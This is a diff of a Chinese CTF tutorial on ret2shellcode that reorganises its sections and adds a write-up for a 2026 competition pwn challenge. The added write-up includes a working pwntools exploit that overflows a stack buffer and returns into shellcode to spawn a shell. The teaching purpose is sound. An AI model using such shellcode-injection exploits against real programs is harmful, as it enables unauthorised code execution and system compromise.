@@ -13,7 +13,7 @@ recommend: 10
 
 ---
 
-## 1. ret2shellcode 基础概念
+## ret2shellcode 基础概念
 
 > **什么是 ret2shellcode？**
 >
@@ -67,7 +67,38 @@ recommend: 10
 
 ---
 
-## 2. 案例分析一：[HNCTF 2022 Week1] ret2shellcode
+### 1.5 重点总结与避坑指南
+
+#### 1.5.1 ret2shellcode 适用场景
+
+> - **NX 保护** 未开启或被 `mprotect` 改写。
+> - 能够预测或泄露 Shellcode 所在的内存地址。
+> - 存在溢出点劫持控制流。
+
+---
+
+#### 1.5.2 避坑指南
+
+| 易错点                   | 原因与影响                                                   |
+| :----------------------- | :----------------------------------------------------------- |
+| **`send` vs `sendline`** | `sendline` 会多发一个 `\n`，可能污染下一次输入或破坏长度。在 `read` 系统调用下优先使用 `send`。 |
+| **`\x00` 截断**          | `strcpy` 类函数遇到 null 字节会停止，导致 Shellcode 传输不全。 |
+| **栈对齐**               | 64 位程序在调用函数前要求 **RSP 16 字节对齐**。若 Shellcode 执行异常，可尝试加入 `ret` 垫片。 |
+| **Shellcode 长度**       | 缓冲区较小时，优先考虑手写短 Shellcode 或利用 `push` 指令构造。 |
+
+---
+
+### 1.6参考资料
+
+- Pwntools Documentation
+- x86-64 System Call Table (execve = 59)
+- Shell-storm Shellcode Database
+
+
+
+---
+
+## [HNCTF 2022 Week1] ret2shellcode
 
 **题目信息：** https://www.nssctf.cn/problem/2934
 
@@ -163,7 +194,7 @@ r.interactive()
 
 ---
 
-## 3. 案例分析二：[GDOUCTF 2023] ezshellcode
+## [GDOUCTF 2023] ezshellcode
 
 **题目考点：** ret2shellcode + 栈溢出 + **短 Shellcode 构造**
 
@@ -250,27 +281,62 @@ r.interactive()
 
 ---
 
-## 4. 重点总结与避坑指南
+## [御网杯2026]PWN3
 
-### 4.1 ret2shellcode 适用场景
-> - **NX 保护** 未开启或被 `mprotect` 改写。
-> - 能够预测或泄露 Shellcode 所在的内存地址。
-> - 存在溢出点劫持控制流。
+::alert{icon="tabler:files" color="var(--c-accent)" title="附件地址"}
 
----
+[下载链接](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/御网杯2026/pwn3)
 
-### 4.2 避坑指南
+::
 
-| 易错点                   | 原因与影响                                                   |
-| :----------------------- | :----------------------------------------------------------- |
-| **`send` vs `sendline`** | `sendline` 会多发一个 `\n`，可能污染下一次输入或破坏长度。在 `read` 系统调用下优先使用 `send`。 |
-| **`\x00` 截断**          | `strcpy` 类函数遇到 null 字节会停止，导致 Shellcode 传输不全。 |
-| **栈对齐**               | 64 位程序在调用函数前要求 **RSP 16 字节对齐**。若 Shellcode 执行异常，可尝试加入 `ret` 垫片。 |
-| **Shellcode 长度**       | 缓冲区较小时，优先考虑手写短 Shellcode 或利用 `push` 指令构造。 |
+提供了两个版本，一个是shellcode，一个进阶版本的ret2libc，祝师傅玩的开心
 
 ---
 
-## 5. 参考资料
-- Pwntools Documentation
-- x86-64 System Call Table (execve = 59)
-- Shell-storm Shellcode Database
+### 0x01 分析程序
+
+初步分析
+
+![image-20260605174715628](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180540525-993531558.png)
+
+#### main()函数
+
+![image-20260605174736549](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180540150-1763988746.png)
+
+#### vuln()函数
+
+![image-20260605174605138](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180539766-496821549.png)
+
+#### Shift+F12
+
+![image-20260605174901657](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260605180538993-603758284.png)
+
+已知条件
+
+vuln函数出现栈溢出，同时没有类似system和/bin/sh的字符串，利用ROPgadget也找不到类似字符，但是栈并没有开启NX保护，所以本题就是ret2shellcode
+
+---
+
+### 0x02 EXP构造
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64')
+
+r = process('./vuln')
+
+r.recvuntil(b"Buffer at:")
+buf_addr = int(r.recvline().strip(),16)
+
+shell = asm(shellcraft.sh())
+ret = 0x0401207
+payload = shell.ljust(0x80,b'\x00')+p64(ret)+p64(buf_addr)
+
+r.recvuntil(b"Message: ")
+r.sendline(payload)
+
+r.interactive()
+```
+
+## 
